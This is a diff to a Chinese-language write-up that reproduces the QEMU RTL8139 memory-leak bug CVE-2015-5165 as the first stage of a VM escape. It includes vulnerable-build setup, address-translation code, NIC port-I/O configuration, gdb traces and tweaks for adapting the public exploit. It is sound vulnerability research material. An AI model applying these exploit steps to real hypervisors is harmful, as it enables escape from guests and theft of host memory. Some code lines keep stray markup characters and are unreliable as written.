@@ -38,7 +38,7 @@ KVM的用户空间组件包含在主线QEMU（快速仿真器）中，该QEMU特
 
 由于我们定位的漏洞已经修复，因此我们需要签出QEMU存储库的源，并切换到这些漏洞的修复之前的提交。 然后，我们仅为目标x86_64配置QEMU并启用调试，在我们的测试环境中，我们使用Gcc的4.9.2版构建QEMU：
 
-```
+```shell
     $ git clone git://git.qemu-project.org/qemu.git
     $
     $ git checkout bd80b59
@@ -51,21 +51,21 @@ KVM的用户空间组件包含在主线QEMU（快速仿真器）中，该QEMU特
 
 使用qemu-img来生成一个qcow2系统文件
 
-```
-**`$`**` ./qemu-img create -f qcow2 ubuntu.qcow2 20G`
+```shell
+$ ./qemu-img create -f qcow2 ubuntu.qcow2 20G`
 $ sudo chmod 666 /dev/kvm
 ```
 
 之后首先通过qemu-system-x86_64完成对qcow2系统文件中系统的安装，需要用-cdrom对iso镜像文件进行加载
 
-```
+```shell
 $ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -hda ./ubuntu.qcow2 -cdrom\
  '/home/han/VMescape/ubuntu-16.04-server-amd64.iso'
 ```
 
 安装完成后就获得了一个有系统的qcow2文件，我们分配2GB的内存并创建两个网络接口卡：RTL8139和PCNET，同时创建tap接口连接虚拟机和主机：
 
-```
+```shell
 ✗ sudo tunctl -t tap0 -u `whoami`
 ✗ sudo ifconfig tap0 192.168.2.1/24
 $ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \
@@ -79,7 +79,7 @@ format=qcow2,if=ide,cache=writeback,\
 使用vncviewer连接qemu
 
 ```
-`apt-get install xvnc4viewer`
+apt-get install xvnc4viewer
 vncviewer 127.0.0.1:5989
 ```
 
@@ -90,21 +90,21 @@ vncviewer 127.0.0.1:5989
 下图说明了来宾的内存和主机的内存如何共存。
 
 
-```
+```shell
                         Guest' processes
                      +--------------------+
 Virtual addr space   |                    |
                      +--------------------+
                      |                    |
- **\__   Page Table     \__
-                        \                    \**
+                     \__   Page Table     \__
+                        \                    \
                          |                    |  Guest kernel
                     +----+--------------------+----------------+
 Guest's phy. memory |    |                    |                |
                     +----+--------------------+----------------+
                     |                                          |
- **\__                                        \__
-                       \                                          \**
+                    \__                                        \__
+                       \                                          \
                         |             QEMU process                 |
                    +----+------------------------------------------+
 Virtual addr space |    |                                          |
@@ -120,7 +120,7 @@ Physical memory    |    |                                               ||
 
 此外，QEMU为BIOS和ROM保留了一个内存区域。 这些映射在QEMU映射文件中可用：
 
-```
+```shell
 ✗ cat /proc/36220/maps
 555aae05c000-555aae931000 r-xp 00000000 08:01 2239549 /usr/bin/qemu-system-x86_64
 555aaeb30000-555aaecfc000 r--p 008d4000 08:01 2239549 /usr/bin/qemu-system-x86_64
@@ -156,8 +156,8 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0         [vsyscall]
 
 在x64系统上，虚拟地址由页偏移量（位0-11）和页码组成。 在linux系统上，具有CAP_SYS_ADMIN特权的用户空间进程能够使用页面映射文件（pagemap ）找出虚拟地址和物理地址的映射。 页面映射文件为每个虚拟页面存储一个64位值，其中`physical_address = PFN * page_size + offset`
 
-```
-**- Bits 0-54  : physical frame number if present.**
+```shell
+- Bits 0-54  : physical frame number if present.
 - Bit  55    : page table entry is soft-dirty.
 - Bit  56    : page exclusively mapped.
 - Bits 57-60 : zero
@@ -181,13 +181,13 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0         [vsyscall]
 1. 根据物理内存的 PFN （**physical frame number**）以及页内偏移，就可以计算出对应的物理地址；
 
 ```
-`physical_address = PFN * page_size + offset
-physcial_addr ``=`` ``(``page_frame_number ``<<`` PAGE_SHIFT``)`` ``+`` distance_from_page_boundary_of_buffer`
+physical_address = PFN * page_size + offset
+physcial_addr =(page_frame_number << PAGE_SHIFT) + distance_from_page_boundary_of_buffer
 ```
 
 我们依靠Nelson Elhage的[代码](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c)。 下面的程序分配一个缓冲区，并用字符串“Where am I?”填充它。 并打印其物理地址：
 
-```
+```c
 ---[ mmu.c ]---
 #include <stdio.h>
 #include <string.h>
@@ -256,7 +256,7 @@ int main()
 ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_29.png)
 在主机将gdb附加到QEMU进程，我们可以看到缓冲区位于为guest虚拟机分配的物理地址空间内。 更准确地说，输出的guest物理地址地址实际上是与**guest物理内存基址**的偏移量。
 
-```
+```shell
 ✗ sudo gdb qemu-system-x86_64 38140
 (gdb) info proc mappings
 process 38140
@@ -269,7 +269,7 @@ Mapped address spaces:
       0x556857d67000     0x5568581ca000   0x463000        0x0
       0x556859c27000     0x55685b038000  0x1411000        0x0 [heap]
                 ...                 ...        ...        ...
-      **0x7f72afe00000** **** **0x7f732fe00000** **** **0x80000000**        0x0 [2GB RAM]
+      0x7f72afe00000     0x7f732fe00000 0x80000000        0x0 [2GB RAM]
                 ...                 ...        ...        ...
 (gdb) x/s 0x7f72afe00000+0x73b17b20
 0x7f7323917b20: "Where am I?"
@@ -288,7 +288,7 @@ REALTEK网卡支持两种 接收/发送 操作模式：C模式和C +模式。 �
 
 该漏洞存在于hw/net/rtl8139.c的 rtl8139_cplus_transmit_one 函数中：
 
-```
+```c
 /* ip packet header */
 ip_header *ip = NULL;
 int hlen = 0;
@@ -317,7 +317,7 @@ if (proto == ETH_P_IP)
     } else {
         hlen = IP_HEADER_LENGTH(ip);
         ip_protocol = ip->ip_p;
-        **ip_data_len** **= be16_to_cpu(ip->ip_len) - hlen;**
+        ip_data_len** **= be16_to_cpu(ip->ip_len) - hlen;
     }
 }
 ```
@@ -326,8 +326,8 @@ IP头包含两个字段hlen和ip-> ip_len，分别表示IP头的长度（考虑�
 
 更精确地讲，ip_data_len稍后用于计算TCP数据的长度，如果该数据超过MTU的大小，则将其逐块复制到一个malloc缓冲区中：
 
-```
-int **tcp_data_len** **= ip_data_len - tcp_hlen;**
+```c
+int tcp_data_len** **= ip_data_len - tcp_hlen;
 int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;
 
 int is_last_frame = 0;
@@ -363,7 +363,7 @@ for (tcp_send_offset = 0; tcp_send_offset < tcp_data_len;
 
 下图显示了RTL8139寄存器。 我们将不详述所有这些内容，而是仅详述与我们的利用相关的那些内容：
 
-```
+```shell
             +---------------------------+----------------------------+
     0x00    |           MAC0            |            MAR0            |
             +---------------------------+----------------------------+
@@ -395,7 +395,7 @@ for (tcp_send_offset = 0; tcp_send_offset < tcp_data_len;
 
 Rx/Tx描述符 由以下结构定义，其中buf_lo和buf_hi分别是Tx/Rx缓冲区的低32位和高32位物理存储地址。 这些地址指向保存要发送/接收的数据包的缓冲区，并且必须在页面大小边界上对齐。 变量dw0对缓冲区的大小以及其他标志（例如所有权标志）进行编码，以表示缓冲区是由网卡还是由驱动程序拥有。
 
-```
+```c
 struct rtl8139_desc {
     uint32_t dw0;
     uint32_t dw1;
@@ -406,7 +406,7 @@ struct rtl8139_desc {
 
 网卡通过in*()  out*()原语（来自sys/io.h）进行配置。 为此，我们需要具有CAP_SYS_RAWIO特权。 以下代码段配置了网卡并设置了一个Tx描述符。
 
-```
+```c
 #define RTL8139_PORT        0xc000
 #define RTL8139_BUFFER_SIZE 1500
 
@@ -442,14 +442,14 @@ outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
 phrack随附的源代码中提供了完整的利用（cve-2015-5165.c）。（ uuencode用于将二进制文件编码为纯ASCII文本，以便可以通过电子邮件发送它们。）
 cve-2015-5165.c依赖qemu.h头文件中的函数偏移地址，因此首先需要通过[build-exploit.sh](https://github.com/jiayy/android_vuln_poc-exp/blob/master/EXP-2015-7504/build-exploit.sh)来进行计算。
 
-```
+```shell
 ./build-exploit.sh '/home/han/VMescape/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64'
 ```
 
 该漏洞利用程序在网卡上配置所需的寄存器，并设置Tx和Rx缓冲区描述符。 然后，它伪造了格式错误的IP数据包，该IP数据包的目的地址和源地址为网卡的MAC地址。 这使我们能够通过访问已配置的Rx缓冲区来读取泄漏的数据。
 通过对qemu运行程序下断点，可用看到漏洞触发的过程，由于ip_len小于伪造的hlen，导致最后tcp_data_len比实际的 tcp 数据大， 多余的内存区会被拷贝到包里发送出去（网卡需要配置为loopback 口）
 
-```
+```shell
 (gdb) b rtl8139.c:2173
 Breakpoint 1 at 0x55a5ef757b03: file /home/han/VMescape/qemu/hw/net/rtl8139.c, line 2173.
 (gdb) c
@@ -493,7 +493,7 @@ at /home/han/VMescape/qemu/hw/net/rtl8139.c:2231
 
 虚拟机内部的用户进程通过读取收包队列的数据包就可以知道被泄露的那块 qemu 内存区的内容。在分析泄漏的数据时，我们观察到存在多个函数指针。经过调试，发现这些函数指针都是struct ObjectProperty这个 qemu 内部结构体的数据。struct ObjectProperty 包含 11 个指针, 这里边有 4 个函数指针 **get/set/resolve/release**
 
-```
+```c
 typedef struct ObjectProperty
 {
     gchar *name;
@@ -511,7 +511,7 @@ typedef struct ObjectProperty
 
 QEMU遵循对象模型来管理设备，内存区域等。启动时，QEMU创建多个对象并为其分配属性。 例如，以下的函数将“may-overlap”属性添加给一个内存区域对象。 此属性具有getter方法，可以检索此boolean属性的值：
 
-```
+```c
 object_property_add_bool(OBJECT(mr), "may-overlap",
                          memory_region_get_may_overlap,
                          NULL, /* memory_region_set_may_overlap */
@@ -545,18 +545,18 @@ RTL8139网卡设备仿真器在堆上保留了64 KB的空间以重组数据包�
 
 这样获取到的是 .plt.got 段，在我的环境里， mprotect 等系统函数符号没有在 .plt.got 这个段，而是在 .plt 这个段。因此替换如下：
 
-```
+```shell
 #plt=$(readelf -S $binary | grep plt | tail -n 1 | awk '{print $2}')
 plt=.plt
 ```
 
 1. Phrack 文章提供的 Exploit 代码中搜索的地址是PHY_MEM + 0x78，但实际上并不固定为0x78，更通用的做法是统计泄露的数据中出现的 `uint64_t` 类型的数据 `0x00007FXXYYZZZZZZ` ，其中 `7FXXYY` 出现次数最多的数据，就是 QEMU 虚拟机物理内存的结束地址；修改之后成功获得物理地址
 
-<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_31.png" width="50%" height="50%">
+<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_31.png">
 
 通过 gdb 调试验证结果正确性：
 
-<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_32.png" width="50%" height="50%">
+<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_32.png" >
 
 ## ref
 http://jiayy.me/2019/04/15/CVE-2015-5165-7504/
